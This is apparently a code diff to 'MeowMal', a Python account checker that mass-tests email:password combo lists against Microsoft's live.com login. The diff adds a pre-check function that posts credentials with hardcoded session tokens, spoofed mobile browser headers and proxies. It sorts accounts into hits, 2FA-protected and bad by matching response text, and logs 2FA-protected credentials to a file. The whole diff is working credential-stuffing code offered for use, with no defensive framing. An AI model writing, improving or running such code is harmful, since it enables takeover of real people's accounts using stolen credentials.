@@ -356,7 +356,7 @@ class UIManager:
         if not getattr(self, 'log_initialized', False):
             self.clear_screen()
             _title = Fore.CYAN
-            ascii_logo = '   __  __                    __  __       _ \n  |  \\/  |                  |  \\/  |     | | ' + '\n  | \\  / | ___  _____      _| \\  / | __ _| | ' + '\n  | |\\/| |/ _ \\/ _ \\ \\ /\\ / / |\\/| |/ _` | | ' + '\n  | |  | |  __/ (_) \\ V  V /| |  | | (_| | | ' + '\n  |_|  |_|\\___|\\___/ \\_/\\_/ |_|  |_|\\__,_|_| ' + "\n  Version: O.8 | Dev: MeowMal Dev's \n"
+            ascii_logo = '   __  __                    __  __       _ \n  |  \\/  |                  |  \\/  |     | | ' + '\n  | \\  / | ___  _____      _| \\  / | __ _| | ' + '\n  | |\\/| |/ _ \\/ _ \\ \\ /\\ / / |\\/| |/ _` | | ' + '\n  | |  | |  __/ (_) \\ V  V /| |  | | (_| | | ' + '\n  |_|  |_|\\___|\\___/ \\_/\\_/ |_|  |_|\\__,_|_| ' + "\n  Version: O.9 | Dev: MeowMal Dev's \n"
             print(Fore.CYAN + ascii_logo + Style.RESET_ALL)
             print('')
             print(f'{_title}Live Logs{Style.RESET_ALL}' + ' ' * max(0, getattr(self, 'width', 120) - len(self._strip_ansi('Live Logs'))))
@@ -2894,6 +2894,91 @@ def getproxy():
                 ui.log_error(f'Proxy format error: {str(e)}')
             return {}
     return {}
+def pre_check_combo(email, password):
+    
+    global twofa, maxretries, fname
+    
+    url = "https://login.live.com/ppsecure/post.srf"
+    
+    params = {
+        'nopa': "2", 'client_id': "7d5c843b-fe26-45f7-9073-b683b2ac7ec3",
+        'cobrandid': "8058f65d-ce06-4c30-9559-473c9275a65d", 'contextid': "F3FB0F6AB3D6991E",
+        'opid': "5F188DEDF4A1266A", 'bk': "1768757278",
+        'uaid': "b1d1e6fbf8b24f9b8a73b347b178d580", 'pid': "15216"
+    }
+    
+    payload = {
+        'ps': "2", 'psRNGCDefaultType': "", 'psRNGCEntropy': "", 'psRNGCSLK': "",
+        'canary': "", 'ctx': "", 'hpgrequestid': "",
+        'PPFT': "-Dm65IQ!FOoxUaTQnZAHxYJMOmOcAmTQz4qm3kTra6EWGgOJS3HmmMLM4kwOpB*SxcpnorGvu6Meyzvos0ruiOkVKAh!SdkWlD5KUiiUUpVaBaRmY4op*aKCNkOPi2mBbWnS0mXOvSG7dMuL!5HdVFTPtGTdlQZCucF7LVMbr2BWN6qhWxoXXrBMfvx3BcxGFhNZgbDooHcWy8QO4OOYEXVI2ee3UOWa!S2qTtgO3nriTV67BP7!q8QgpyDMkckNSHQ$$",
+        'PPSX': "P", 'NewUser': "1", 'FoundMSAs': "", 'fspost': "0", 'i21': "0",
+        'CookieDisclosure': "0", 'IsFidoSupported': "1", 'isSignupPost': "0",
+        'isRecoveryAttemptPost': "0", 'i13': "0", 'login': email, 'loginfmt': email,
+        'type': "11", 'LoginOptions': "3", 'lrt': "", 'lrtPartition': "",
+        'hisRegion': "", 'hisScaleUnit': "", 'cpr': "0", 'passwd': password
+    }
+    
+    headers = {
+        'User-Agent': "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Mobile Safari/537.36",
+        'Accept': "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
+        'Accept-Encoding': "gzip, deflate, br, zstd", 'Cache-Control': "max-age=0",
+        'sec-ch-ua': "\"Not(A:Brand\";v=\"8\", \"Chromium\";v=\"144\", \"Google Chrome\";v=\"144\"",
+        'sec-ch-ua-mobile': "?1", 'sec-ch-ua-platform': "\"Android\"",
+        'sec-ch-ua-platform-version': "\"12.0.0\"", 'Origin': "https://login.live.com",
+        'Upgrade-Insecure-Requests': "1", 'Sec-Fetch-Site': "same-origin",
+        'Sec-Fetch-Mode': "navigate", 'Sec-Fetch-User': "?1", 'Sec-Fetch-Dest': "document",
+        'Referer': "https://login.live.com/oauth20_authorize.srf?nopa=2&client_id=7d5c843b-fe26-45f7-9073-b683b2ac7ec3&cobrandid=8058f65d-ce06-4c30-9559-473c9275a65d&contextid=F3FB0F6AB3D6991E&ru=https%3A%2F%2Fuser.auth.xboxlive.com%2Fdefault.aspx&flowtoken=-Dlvz*VDmPVZZLUB5XJxsfDMTTcQljOxDsdPjDKzToqZjduHY6H8mvZDBmfh64KLbJ2nZ9eoEak3Z5i9cv6QnWc1AgKNCTVjbsdSkMM2udkvn*tMhRNlP*KMzWSv4xope0Tedsx0fH4ExWXxj47d!shbqu5cb72XzFK*iJMoesP5oeS*!QeCOp1srGs2ds7c0wcllXOmhW9BF5JvWeVnY4ggTVh*w4TUyV!keqrvHLOJZENELnYgCp5EjzPwdp2QPhnupdnWEyUzkQIzzXeB0HN4BAZJhJpQo3U8Hd3J4Z16oG7vbJZEpdHLpaxVe7RfSvg%24%24&uaid=b1d1e6fbf8b24f9b8a73b347b178d580&opid=5F188DEDF4A1266A",
+        'Accept-Language': "ar,en-US;q=0.9,en;q=0.8,ku;q=0.7,ro;q=0.6"
+    }
+    
+    current_try = 0
+    while current_try <= maxretries:
+        try:
+            proxy_config = None
+            if proxytype != "'4'":
+                try: proxy_config = getproxy()
+                except: pass
+                
+            response = requests.post(url, params=params, data=payload, headers=headers, proxies=proxy_config, timeout=15)
+            status_code = response.status_code
+            response_text = response.text.lower()
+            
+            if status_code >= 500 or status_code == 429:
+                current_try += 1
+                time.sleep(1.5)
+                continue
+                
+            two_fa_indicators = ['suggestedaction', 'sign in to continue', 'enter code', 'two-step', 'two. step', 'two factor', '2fa', 'second verification', 'verification code', 'authenticator', 'texted you', 'sent a code', 'enter the code', 'additional security', 'extra security']
+            if any(ind in response_text for ind in two_fa_indicators):
+                with open(f'results/{fname}/2fa.txt', 'a') as file:
+                    file.write(f'{email}:{password}\n')
+                if UI_ENABLED and ui:
+                    ui.log_2fa(email)
+                with stats_lock:
+                    twofa += 1
+                return "2FA"
+                
+            success_indicators = ['to do that, sign in', 'welcome', 'redirecting', 'location.href', 'home.live.com', 'account.microsoft.com', 'myaccount.microsoft.com', 'profile.microsoft.com', 'https://account.live.com/', 'microsoft account home', 'signed in successfully', "you're signed in"]
+            if any(ind in response_text for ind in success_indicators):
+                return "HIT"
+                
+            failure_indicators = ['invalid username or password', "that microsoft account doesn't exist", 'incorrect password', 'your account or password is incorrect', "sorry, that password isn't right", 'entered is incorrect', "account doesn't exist", 'no account found', 'wrong password', 'incorrect credentials', 'login failed', 'sign in unsuccessful', "we couldn't find an account", 'please check your credentials', 'sign-in was blocked', 'account is locked', 'suspended', 'temporarily locked', 'security challenge', 'unusual activity', 'verify your identity', 'account review', 'safety concerns']
+            if any(ind in response_text for ind in failure_indicators):
+                return "BAD"
+                
+            return "UNKNOWN"
+            
+        except requests.exceptions.RequestException:
+            current_try += 1
+            time.sleep(1.5)
+            continue
+        except Exception as e:
+            if UI_ENABLED and ui:
+                ui.log_error(f'Precheck error {email}: {str(e)[:40]}')
+            return "ERROR"
+            
+    return "ERROR"
+
 def Checker(combo):
     global bad, checked, cpm, hits, errors
     start_time = time.time()
@@ -2927,7 +3012,18 @@ def Checker(combo):
             return
         result = False
         try:
-            result = authenticate(str(email), str(password), use_optimized=True)
+            bypass = pre_check_combo(str(email), str(password))
+            
+            if bypass == "HIT" or bypass == "UNKNOWN":
+                result = authenticate(str(email), str(password), use_optimized=True)
+            elif bypass == "2FA":
+
+                result = True 
+            elif bypass == "BAD":
+                result = False
+            else:
+                result = False
+                
             if warn_on_slow and time.time() - start_time > warn_threshold:
                 if UI_ENABLED and ui:
                     ui.add_log(f'Other: Slow check (> {warn_threshold}s): {email}', 'INFO')
